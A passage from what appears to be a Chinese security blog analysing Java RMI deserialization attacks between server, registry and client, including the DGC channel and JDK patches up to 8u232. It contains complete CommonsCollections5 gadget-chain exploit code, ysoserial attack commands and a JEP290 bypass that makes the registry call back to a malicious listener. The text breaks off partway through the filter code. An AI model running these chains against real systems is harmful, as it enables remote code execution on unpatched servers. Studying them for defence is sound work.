<p>在该函数中确实接收到了注册中心的返回值，首先反序列化出var4传输返回码，该值必须为81.前面也确实传了81这个值。紧接着反序列化出var1。该值为1。因此进入case 1:的分支，直接返回了。但从代码中可以看到，若var1的值为2，则会进行反序列化。到这里整个流程分析结束了。</p>
<p><img src="15.png" alt=""></p>
<p>可以看到在上述的过程中，服务端和注册中心都有能够反序列化的点。</p>
<h2 id="服务端攻击注册中心–bind-JDK-lt-8u121"><a href="#服务端攻击注册中心–bind-JDK-lt-8u121" class="headerlink" title="服务端攻击注册中心–bind (JDK&lt;8u121)"></a>服务端攻击注册中心–bind (JDK&lt;8u121)</h2><p>服务端在进行bind时，将name和object发送至注册中心，注册中心在这里进行了直接的反序列化。前面提到过，为了安全起见，仅接收本地的bind请求，只是这个判断checkAcess(“Registry.bind”)发生在反序列化之后。因此造成了，虽然bind失败，但反序列化已经发生了。</p>
<p>因此，向注册中心bind/rebind一个精心构造的remote对象，即可造成RCE。这里可以选择CommonsCollections系列的gadget进行利用。前提是注册中心也存在对应的gadget。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>这是一个绑定了恶意的远程对象的服务端代码，利用了CommonsCollections5。构造了一个BadAttributeValueException对象，由于传过去的对象需要实现Remote接口，选择了动态代理的方法来满足这一条件。在这里的动态代理类选择了AnnotationInvocationHandler。反序列化的触发点为handler的memberValues属性即tmpMap被反序列化时执行了利用链，从而RCE了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            tmpMap.put(<span class="string">"pwn"</span>, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="keyword">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">tmpMap</span>)</span>;</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">"hello1"</span>, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行这段代码后，注册中心就弹出了计算器(环境为JDK8u111)。这段代码同时也是ysoserial工具的RMIRegistryExploit代码。该工具的利用方式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip port CommonsCollections7 &quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><ul>
<li>在JDK8u141之后，将判断是否为本地绑定请求挪到了执行反序列化之前，如下所示:</li>
</ul>
<p><img src="16.png" alt=""></p>
<ul>
<li>JDK8u121修复版本后，出现了JEP290。它在注册中心端内置了白名单，仅允许特定的类被反序列化。而上述代码使用的AnnotationInvocationHandler类不在白名单中，不允许反序列化。(后面介绍了绕过方式)</li>
</ul>
<h2 id="注册中心攻击服务端"><a href="#注册中心攻击服务端" class="headerlink" title="注册中心攻击服务端"></a>注册中心攻击服务端</h2><p>服务端在接收注册中心返回值时，若返回的是TransportConstants.ExceptionReturn，即值为2，就会进入case 2的分支，进行反序列化。因此注册中心攻击服务端的方式，就是伪造一个恶意的注册中心，向服务端返回TransportConstants.Return、TransportConstants.ExceptionalReturn、UID以及恶意的object。  </p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>ysoserial工具实现了这么一个恶意的注册中心，<code>ysoserial.exploit.JRMPListener</code>。截取部分关键代码，如下所示:</p>
<p><img src="18.png" alt=""></p>
<p>可以看到它发送了81，2，ID以及恶意的obj。复现的方式很简单，首先用ysoserial启动一个注册中心。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<p>然后启动服务端代码，进行bind操作，就会发现在服务端弹出了计算器。</p>
<h2 id="绕过JEP290-JDK-lt-8u232-b09"><a href="#绕过JEP290-JDK-lt-8u232-b09" class="headerlink" title="绕过JEP290 (JDK&lt;8u232_b09)"></a>绕过JEP290 (JDK&lt;8u232_b09)</h2><p>前面攻击注册中心时，在JDK8u121后，就出现了JEP290限制。要绕过这个限制，需要在白名单中找到可以利用的对象。这里关注<code>UnicastRef</code>对象。  在RMI过程中客户端与注册中心、服务端与注册中心之间建立连接都用到了UnicastRef类。用UnicastRef对象新建一个RMI连接可以绕过JEP290的限制。</p>
<p>整个思路就是:封装一个UnicastRef对象，其中包括恶意注册中心的ip和port。使得其在原注册中心被反序列化时，反向连接一个恶意注册中心，此时原注册中心相当于客户端，由1.2攻击可知，恶意注册中心向客户端发送恶意的payload，这一过程是不受JEP290影响的。</p>
<p>来看一下客户端连接上注册中心的具体实现，定位到<code>java.rmi.registry#getRegistry</code>。<br><img src="31.png" alt=""></p>
<p>它通过TCPEndpoint注册注册中心的host、port等信息。然后用UnicastRef封装了LiveRef类。最后进入Util.createProxy()方法。跟进此方法。</p>
<p><img src="32.png" alt=""></p>
<p>在该函数中，使用动态代理处理类RemoteObjectInvocationHandler作为UnicastRef动态处理类。到这里整个连接过程结束了。事实上只需要封装一个包含恶意注册中心的host、port的UnicastRef类，然后使用RemoteObjectInvocationHandler动态代理它。</p>
<p>ysoserial工具中实现了向原注册中心(受害者)发送UnicastRef对象的JRMPClient。<code>ysoserial.payloads.JRMPClient</code>。来看一下它的关键代码。</p>
<p><img src="30.png" alt=""></p>
<p>可以看到与上述的过程一样。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先启动一个恶意的注册中心，可以利用JRMPListener实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<p>然后启动一个客户端，还是利用的是1.1攻击中ysoserial中的RMIRegistryExploit，其中payload选择ysoserial.payloads.JRMPClient而不是CommonsCollections。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 JRMPClient &quot;127.0.0.1:1098&quot;</span><br></pre></td></tr></table></figure>

<p>此时在注册中心弹出了计算器。注册中心在接收到UnicastRef对象后进行反序列化最终由DGCClient向恶意注册中心发起连接，即在反向连接的过程是DGC通信方式。有兴趣的可以自己跟一下过程。</p>
<h3 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h3><p>在JDK8u232_b09版本中，修复了这种反向发起JRMP连接的利用。修复点包括:</p>
<ol>
<li>在<code>sun.rmi.registry.RegistryImpl_Skel#dispath</code>中在反序列化时，若反序列化失败/类型转换失败，就会进入discardPendingRefs()。它会清除掉目前的RMI连接。</li>
</ol>
<p><img src="1-1.png" alt=""></p>
<ol start="2">
<li>第一个补丁，其实在清除之前已经执行了反序列化。但是在复现过程中还是失败了，因为在DGC通信中，对发送/接收的数据都进行了过滤。详情可见后面<code>4.1#补丁</code>。</li>
</ol>
<h1 id="注册中心与客户端"><a href="#注册中心与客户端" class="headerlink" title="注册中心与客户端"></a>注册中心与客户端</h1><p>客户端与注册中心的交互主要是客户端通过list()、lookup()函数向注册中心发出请求。与服务端一样，客户端首先通过LocateRegistry.getRegistry()获的RegistryImpl_Stub对象，跟进lookup()函数。</p>
<p><img src="19.png" alt=""></p>
<p><font color=#EE7942>[客户端]</font>与服务端一样，先建立连接，注意这里的opnum为2，代表的是lookup操作。它首先将查询的参数值String类型的变量发送出去。</p>
<p><font color=#43CD80>[注册中心]</font>注册中心这边同样是dispatch()函数处理。当case为2时，处理方式如下所示:</p>
<p><img src="20.png" alt=""></p>
<p>先反序列化传入的参数，然后进行lookup()操作，lookup()操作就是简单地根据name参数值查询绑定的Remote对象。完成这一部分后，与上面一样，注册中心向客户端返回值。然后还有一个把查询到的Remote对象进行序列化传输。</p>
<p><font color=#EE7942>[客户端]</font>客户端接收到注册中心的返回值后，进行的invoke函数与前面服务端一样。若接收到了ransportConstants.ExceptionalReturn就会进行反序列化。与服务端bind操作不同的是，在完成这一系列后，它还会从当前的输入流中反序列化出Remote对象。至此整个过程结束。</p>
<h2 id="客户端攻击注册中心-JDK-lt-8u121"><a href="#客户端攻击注册中心-JDK-lt-8u121" class="headerlink" title="客户端攻击注册中心(JDK&lt;8u121)"></a>客户端攻击注册中心(JDK&lt;8u121)</h2><p>这一点与服务端类似，即注册中心接收到客户端传过来的数据后，会进行反序列化。因此，若客户端lookup的参数值为一个object类型，就可以使得注册中心反序列化执行任意命令。因此，需要修改lookup函数，使之支持object类型参数。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>在构造lookup函数请求时，只需要重新实现lookup函数的实现。这里介绍wh1t3p1g师傅写的一个<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/exploit/rmi/component/Naming.java" target="_blank" rel="noopener">改造版lookup函数</a>。将Naming.lookup和RegistryImpl_Stub.lookup合并在一起了。</p>
<p><img src="33.png" alt=""></p>
<p>利用CommonsCollections5，构造如下payload。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1099</span>);</span><br><span class="line">            Naming.lookup(registry,badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中Naming的look函数实现，我从wh1t3p1g师傅写的代码中抽出来了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Naming</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Naming</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception, IOException, ClassNotFoundException, RuntimeException, RemoteException, NotBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Field ref1 = getField(registry.getClass(),<span class="string">"ref"</span>);</span><br><span class="line">        RemoteRef ref = (RemoteRef) ref1.get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> interfaceHash = <span class="number">4905912898345647071L</span>;</span><br><span class="line"></span><br><span class="line">        Field operations1 = getField(registry.getClass(),<span class="string">"operations"</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) operations1.get(registry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                out.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">"error marshalling arguments"</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            java.rmi.Remote $result;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectInput in = call.getInputStream();</span><br><span class="line">                $result = (java.rmi.Remote) in.readObject();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                ref.done(call);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.UnexpectedException(<span class="string">"undeclared checked exception"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行客户端的代码，会在注册中心弹出计算器。</p>
<h3 id="补丁-2"><a href="#补丁-2" class="headerlink" title="补丁"></a>补丁</h3><p>相对于服务端的bind方式需要在本地执行，lookup函数没有这个限制。但是它同样受到JEP290的限制。  </p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过方式与前面所提的绕过方式一样。lookup一个UnicastRef对象。</p>
<h2 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h2><p>从这个过程中可以看到，客户端被攻击执行反序列化的条件和服务端杯攻击执行反序列化的条件一样。与1.2一样。这里就不再赘述了。若是不采用返回TransportConstants.ExceptionalReturn，也可以将返回的Remote对象换成恶意的object。</p>
<h1 id="客户端与服务端"><a href="#客户端与服务端" class="headerlink" title="客户端与服务端"></a>客户端与服务端</h1><p>客户端与服务端之间的交互过程，主要是在客户端通过lookup获取到了注册在注册中心的远程对象引用后，调用远程对象方法时。在调用方法时将与服务端进行连接，将方法及各项参数传输过去。服务端在接收到数据后，在服务端完成方法的调用，然后将结果返回给客户端的一个过程。接下来就来仔细分析一下它。</p>
<p>首先在这个过程中，客户端需要具有远程对象的接口。且其全限定名必须与服务器上的对象完全相同。可以理解为Stub对象是远程对象在本地的一个代理，当客户端调用方法时，Stub对象将会调用通过网络传递给远程对象。</p>
<p><font color=#EE7942>[客户端]</font>客户端在完成lookup查询后返回的远程对象Stub使用RemoteObjectInvocationHandler类进行动态代理，即在调用其任何方法之前，必须先调用RemoteObjectInvocationHandler#invoke方法。<br><img src="21.png" alt=""></p>
<p>跟进invokeRemoteMethod方法。<br><img src="22.png" alt=""></p>
<p>在这里进入UnicastRef.invoke()函数。继续跟进。<br><img src="23.png" alt=""></p>
<p>在该函数中，首先建立与服务端的连接，然后向服务端发送调用方法的参数类型、参数值。</p>
<p><font color=#4682B4>[服务端]</font>服务端接收处理客户端传过来的数据的函数在<code>sun.rmi.server.UnicastServerRef#dispatch</code>。定位到该函数</p>
<p><img src="24.png" alt=""></p>
<p>传入的var3为-1，直接进入后面，通过传入的var4，也就是方法的hash值，来查询到方法Method Var8。然后将输入流进行unmarshalCustomCallData，相当于解密一样。然后进入unmarshalParameters()函数，该函数中对var1进行了判断，然后进入unmarshalParametersUnchecked()函数，跟进该函数。</p>
<p><img src="25.png" alt=""></p>
<p>该函数中获取方法的参数类型，然后进入unmarshalValue，根据参数类型反序列化出参数值。跟进unmarshalValue函数。</p>
<p><img src="26.png" alt=""></p>
<p>这里会根据参数类型进行反序列化，若参数类型不是原生类型，则就直接进行object的反序列化readObject。</p>
<p><img src="2-2.png" alt=""><br>在反序列化得到参数值之后，回到dispatch方法，接着往下走，然后直接调用方法，获得方法调用的返回值var10。紧接着又到了熟悉的getResultStream(true)方法，这里会向客户端返回81、1以及ID值。</p>
<p>然后对方法调用的返回值进行判断，若返回值不为Void类型，进入marshalValue()方法。在marshalValue()方法中会对其进行序列化发送给客户端。</p>
<p><font color=#EE7942>[客户端]</font>客户端在完成发送数据之后，就会进入var7.executeCall()方法等待服务端的返回值，和之前一样，若接收到ransportConstants.ExceptionalReturn后，就会进行直接的反序列化。</p>
<p>然后继续获取方法调用的方法值，若该值不为void，会进入unmarshalValue()方法根据类型进行反序列化。到这里整个的方法调用就结束了。</p>
<p>从以上流程中可以进行反序列化的点来看，存在以下攻击。</p>
<h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>若客户端调用的方法参数类型为object类型，则传入一个恶意的object类型，进行反序列化则会导致服务端执行任意命令。实际场景中很少有object类型的参数。攻击者可以用恶意对象替换从Object类派生的参数。</p>
<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>将服务端的HelloInterface接口中的sayHello函数参数改为object类型。同时将客户端的HelloInterface接口中方法的参数改为object类型。</p>
<p>客户端的代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1099</span>);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(<span class="string">"hello1"</span>);</span><br><span class="line">            System.out.println(hello.sayHello(badAttributeValueExpException));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行客户端代码，会导致服务端反序列化，弹出计算器。</p>
<h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>客户端导致反序列化点有如下:</p>
<ul>
<li>接收到ransportConstants.ExceptionalReturn后，进行反序列化。</li>
<li>方法调用的返回值是一个恶意object，导致反序列化。</li>
</ul>
<p>对于第一点和1.2、2.2一样。对于第二点，直接修改服务端方法的返回值即可。</p>
<h1 id="DGC通讯方式"><a href="#DGC通讯方式" class="headerlink" title="DGC通讯方式"></a>DGC通讯方式</h1><p>除了以上容易想到的通信方式，还有DGC(分布式垃圾收集)，这是RMI框架用来管理远程对象生命周期的机制。可以通过与DGC通信的方式发送恶意的payload让注册中心反序列化。</p>
<p><font color=#EE7942>[客户端]</font>定位到<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>。<br><img src="27.png" alt=""></p>
<p>它的整个过程和前面lookup函数很像。可以看到它先新建了一个socket，然后经过一个过滤，将ObjID、var2以及Lease对象序列化到输出流中。然后执行UnicastRef.invoke函数。</p>
<p><font color=#43CD80>[注册中心]</font>定位到<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>。case为1的地方。因为前面传输的为1。<br><img src="28.png" alt=""></p>
<p>可以看到，直接进行了反序列化操作，若传入的是恶意的object就可以RCE了。剩下的流程与客户端使用lookup与注册中心交互的流程一样。</p>
<h2 id="客户端攻击注册中心-JDK-lt-8u121-1"><a href="#客户端攻击注册中心-JDK-lt-8u121-1" class="headerlink" title="客户端攻击注册中心(JDK &lt; 8u121)"></a>客户端攻击注册中心(JDK &lt; 8u121)</h2><p>客户端如果通过DGC通信方式向注册中心发送恶意的obj，就会导致反序列化。</p>
<p>ysoserial工具中实现了这样的一个客户端<code>ysoserial.exploit.JRMPClient.java</code>。截取部分关键代码。</p>
<p><img src="29.png" alt=""></p>
<p>可以看到它使用DGC通信方式，且以dirty方法的方式。</p>
<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>实际中只需要启动注册中心，然后启动JRMPClient就可。启动JRMPClient命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<p>即可在注册中心弹出计算器。</p>
<h3 id="补丁-3"><a href="#补丁-3" class="headerlink" title="补丁"></a>补丁</h3><p>JEP290同时也对DGC这种通信方式进行了反序列化类的过滤，定位到<code>DGCImpl#checkInput</code>。</p>
<p><img src="5-5.png" alt=""> </p>
<h2 id="注册中心攻击客户端-JDK-lt-8u232-b09"><a href="#注册中心攻击客户端-JDK-lt-8u232-b09" class="headerlink" title="注册中心攻击客户端(JDK&lt;8u232_b09)"></a>注册中心攻击客户端(JDK&lt;8u232_b09)</h2><p>注册中心攻击客户端的方法如上面一样。但是JDK8u232_b09之后，它无法接收到恶意的object。从而无法利用，还是上面其他方式攻击客户端更加适用。</p>
<h3 id="补丁-4"><a href="#补丁-4" class="headerlink" title="补丁"></a>补丁</h3><p>由于前面绕过JEP290的方式进行反向链接时使用的就是DGC通信方式，它在修复时，直接在发送/接收数据时，都会对数据进行一个过滤。导致无法利用。<br><img src="3-3.png" alt=""></p>
<p>在发送/接收时，会进行判断。</p>
<p><img src="4-4.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var1 !&#x3D; UID.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; VMID.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; Lease.class &amp;&amp; </span><br><span class="line">(var1.getPackage() &#x3D;&#x3D; null || !Throwable.class.isAssignableFrom(var1) || !&quot;java.lang&quot;.equals(var1.getPackage().getName()) &amp;&amp;</span><br><span class="line">!&quot;java.rmi&quot;.equals(var1.getPackage().getName())) &amp;&amp;</span><br><span class="line">var1 !&#x3D; StackTraceElement.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; ArrayList.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; Object.class &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableList&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableCollection&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;) &amp;&amp; </span><br><span 